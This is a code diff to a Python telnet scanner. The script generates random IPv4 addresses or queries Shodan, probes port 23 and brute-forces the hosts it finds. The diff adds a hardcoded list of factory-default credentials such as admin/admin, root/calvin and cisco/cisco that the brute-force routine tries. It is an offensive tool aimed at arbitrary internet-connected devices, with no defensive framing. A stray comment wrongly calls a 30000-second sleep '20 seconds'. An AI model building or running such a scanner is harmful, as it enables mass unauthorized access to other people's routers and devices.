@@ -3,14 +3,16 @@ import sys
 import os
 import telnetlib
 
+entries = []
+def add_entry(value_one, value_two):
+    entries.append(value_one)
+    entries.append(value_two)
+
+
+
 def generate_random_ipv4():
     return socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
 
-def default_logins():
-    logins = {
-    'admin' : 'admin',
-    
-    }
 
 def telnetscan(host, port=23):
     try:
@@ -50,7 +52,7 @@ def main():
         else:
             print_help()
 
-    # Try to import the shodan module        
+    # Try to import the shodan module
     if shodan == True:
         try:
             import shodan
@@ -70,15 +72,38 @@ def main():
             pass
         else:
             brute(ip)
-    
+
 
 if __name__ == "__main__":
+    add_entry('admin', 'admin')
+    add_entry('admin', 'password')
+    add_entry('admin', 'michaelangelo')
+    add_entry('admin', '1234')
+    add_entry('user', 'user')
+    add_entry('user', 'password')
+    add_entry('sitecom', 'admin')
+    add_entry('', 'admin')
+    add_entry('', '')
+    add_entry('', 'password')
+    add_entry('', 'connect')
+    add_entry('', 'MiniAP')
+    add_entry('', 'access')
+    add_entry('', '1234')
+    add_entry('1234', '1234')
+    add_entry('root', 'calvin')
+    add_entry('root', 'admin')
+    add_entry('root', '123456')
+    add_entry('sys', 'uplink')
+    add_entry('cac_admin', 'cacadmin')
+    add_entry('piranha', 'q')
+    add_entry('piranha', 'piranha')
+    add_entry('cisco', 'cisco')
     main()
 
 '''
 def test_connection(server, port):
-    
-    
+
+
 while True:
     sleep(30000) # retry connection every 20 seconds
     connstat = test_connection(server, port)
